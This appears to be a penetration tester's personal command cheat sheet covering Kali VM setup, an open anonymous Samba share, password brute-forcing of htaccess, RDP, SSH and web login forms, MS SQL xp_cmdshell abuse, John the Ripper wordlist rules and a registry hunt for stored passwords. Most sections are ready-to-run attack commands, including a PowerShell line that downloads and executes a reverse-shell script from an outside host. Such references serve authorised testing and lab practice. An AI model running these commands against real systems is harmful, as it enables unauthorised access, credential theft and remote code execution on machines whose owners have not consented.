# Command reference


## Kali VM Setup

Commands for easy first-time setup of a Kali/Parrot VM after setting up a new image
<details>
 <summary>Expand</summary>

 ### OpenVPN Client Setup
 After downloading openvpn client configuration (.ovpn):

 ```
 sudo cp client.ovpn /etc/openvpn/[name].conf`
 systemctl [re]start openvpn.service
 systemctl status openvpn@[name].service
 ```

 ### Install/update useful packages and tools
 
 ```
 sudo apt update -y && sudo apt install -y gobuster crowbar metasploit-framework python3-pip python3-venv seclists curl enum4linux ffuf gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf`
 sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 ```
 
 If gobuster install doesn't work:
 
 ```
 sudo apt install golang -y && go get github.com/OJ/gobuster && sudo cp ~/go/bin/gobuster /usr/local/bin
 ```

 ### Setup samba share for easy file transfers
 This makes file transfers between VMs/hosts easy if your Kali VM isn't local, like if it's setup on a server and you need to transfer files from another machine on the network.  This will open a share called "kali_share" under /mnt/kali_share with anonymous access allowed, which can obviously be a huge security risk, so configure it with creds and be careful about what you put in the share if you're worried about that.
 
 <details>
  <summary>Samba Config File</summary>
  
  ```
  [global]
  
  workgroup = WORKGROUP
  server string =  Windows ME
  netbios name = Workstation 
  security = user
  map to guest = bad user
  name resolve order = bcast host
  dns proxy = no
  bind interfaces only = yes


  [kali_share]
     path = /mnt/kali_share
     writable = yes
     browseable = yes
     guest ok = yes
     guest only = yes
     read only = no
     create mode = 0777
     directory mode = 0777
     force user = nobody
  ```
 </details>  
 
 Setup your Samba server with the above config file and start the service
 ```
 mkdir /mnt/kali_share
 sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
 sudo cp new.conf /etc/samba/smb.conf
 sudo systemctl [re]start smbd.service
 sudo systemctl enable smbd.service
 ```
 
 ### Misc setup commands
 ```
 sudo updatedb
 sudo systemctl enable ssh
 sudo systemctl enable openvpn
 sudo wget https://raw.githubusercontent.com/harringtonjd0/security/main/.vimrc -O ~/.vimrc
 
 # Disable system beep because it's annoying
 sudo modprobe -r pcspkr
 sudo bash -c 'echo "blacklist pcspkr" >> /etc/modprobe.d/blacklist.conf'
 ```
</details>

## Network Brute Force Commands

### htacess
```
medusa -h <ip> -u user -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/blocked_dir
```

### RDP
```
crowbar -b rdp -s <ip> -u user -C /usr/share/wordlists/rockyou.txt -n 1
```

### SSH
```
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<ip> -f -v
```

### HTTP Post
```
hydra <ip> http-form-post "/loginpage.php:user=admin&pass=^PASS^:<login failure message>" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
```


## MS SQL RCE and Rev shell

```
sqsh -U sa -S <ip>:<port>

// Test xp cmdshell
xp_cmdshell 'whoami'
go
```

If necessary, enable xp_cmdshell
```
EXEC SP_CONFIGURE 'show advanced options',1
reconfigure
go


EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
go
```

### Rev shell options 
#### Will be tough if AV is running, try surveying system from here to find a better access method

```
xp_cmdshell "powershell IEX(new-object net.webclient).downloadstring('http://1.1.1.2/rev.ps1')"`  
go
```

can also try certutil or powershell wget (if newish PSVersion)



## John Wordlist Mutation

### Will use Wordlist mode rules from /etc/john/john.conf
```
john --rules --wordlist=wordlist.txt hashes.txt
john --rules --stdout --wordlist=wordlist.txt > mutated_wordlist.txt
```

## John Wordlist Rules
```
[List.Rules:Wordlist]
$[0-9]
$[0-9]$[0-9]
cAz"[0-9]"
cAz"[0-9][0-9]"
cAz"[£!$]"
cAz"[0-9][£!$]"
```

#### or add to a custom rules list like [List.Rules:MyRule]
```
john --rules=MyRule --wordlist=wordlist.txt hashes.txt
```

 a good one to use is --rules=Jumbo



## Windows Misc

### Search through registry for "pass" in value name
```
reg query HKLM /f pass /t REG_SZ /s
```
